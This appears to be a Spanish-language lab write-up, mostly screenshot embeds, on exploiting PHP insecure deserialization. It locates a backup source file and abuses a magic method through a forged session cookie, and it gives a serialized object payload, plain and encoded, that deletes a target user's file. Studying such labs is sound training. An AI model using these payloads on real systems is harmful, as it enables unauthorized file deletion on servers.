![[Pasted image 20220926184054.png]]

![[Pasted image 20220926184821.png]]

la sesion tiene una cookie:

![[Pasted image 20220926184943.png]]


verificando el source code:

![[Pasted image 20220926185131.png]]


tratando de acceder:

![[Pasted image 20220926185242.png]]

![[Pasted image 20220926185304.png]]

enviando esta traza al repeater:

![[Pasted image 20220926185411.png]]

agregando al final el caracter ~ por si hay algun archivo de backup en el filesystem:

![[Pasted image 20220926190150.png]]

la siguiente funcion hace uso de un magic method:

![[Pasted image 20220926190242.png]]


revisando la cookie de sesion:

![[Pasted image 20220926190323.png]]

sustituimos por este payload: 

![[Pasted image 20220926190502.png]]

O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}

TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ%3d%3d

envio la traza del archivo php con los cambios:

![[Pasted image 20220926190658.png]]

![[Pasted image 20220926190729.png]]
